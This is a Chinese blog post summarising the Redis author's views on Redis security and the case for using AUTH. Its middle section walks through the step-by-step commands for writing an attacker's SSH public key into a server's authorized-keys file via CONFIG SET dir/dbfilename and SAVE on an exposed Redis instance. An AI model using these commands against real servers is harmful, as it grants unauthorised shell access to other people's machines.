+++
title = "Redis的安全哲学"
draft = false
date = "2016-02-15"
Categories = ["AkiRoss"] 
Description = "" 
Tags = ["redis","安全"] 
toc = true

+++

最近看到Redis的作者antirez写的一篇blog: http://antirez.com/news/96
里面有些东西很有意思.摘录一些观点:
## 为什么Redis这么多"安全漏洞"?

作者说经常收到一些Redis不安全的Report,但是大部分Report其实跟Redis没有什么关系或者说对Redis来说无关紧要.因为Redis的绝大多数用户都是将Redis放到一个安全的环境里面,而安全是一个很大的feature,Redis不会为了一小撮用户做开发这么复杂的功能. 
>it’s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself

## 一次Hack过程
安全页面写到: http://redis.io/topics/security
>the ability to control the server configuration using the CONFIG command makes the client able to change the working directory of the program and the name of the dump file. This allows clients to write RDB Redis files at random paths, that is a security issue that may easily lead to the ability to run untrusted code as the same user as Redis is running

所以,使用config命令可以往主机的Path写文件,作者展示了这一过程(为防止有些`script kiddies cut & paste the attack`,没有直接提供一个脚本,并且还首先备份了当前的数据,这里省略一些无关紧要的步骤):

1. 生成一对RSA key,并且写到一个文件里面,前后加上换行符
```
$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
```
2. 将public key写到一个KV里面
```
cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
```
3. 设置工作目录
```
config set dir /Users/antirez/.ssh/
```
4. 将内存中数据保存到Db文件中
```
config set dbfilename "authorized.keys"
save
```

大功告成!

## 为什么不默认bind 127.0.0.1?
事实上,如果启动时候带上默认的配置文件(redis.conf),就不存在这个安全隐患,因为配置文件里面默认是只绑定了Loopback address.既然作者知道这个安全隐患,为什么不默认启用这个配置文件呢?(就像Mysql那样).

作者的解释是,因为RTFM（Read The Fucking Manual）

## 使用Auth
虽然并不能真正解决安全问题..最简单有效的方法就是使用Auth.使用Auth的的几点说明:

1. 密码要尽可能的复杂,以防被brute force
2. Auth的消耗非常少,只是在连接建立时候做一次鉴权,只有连接在,就不用再做鉴权
3. 未来可能会有ACL机制,比如某些用户并没有`config set dir`的权限


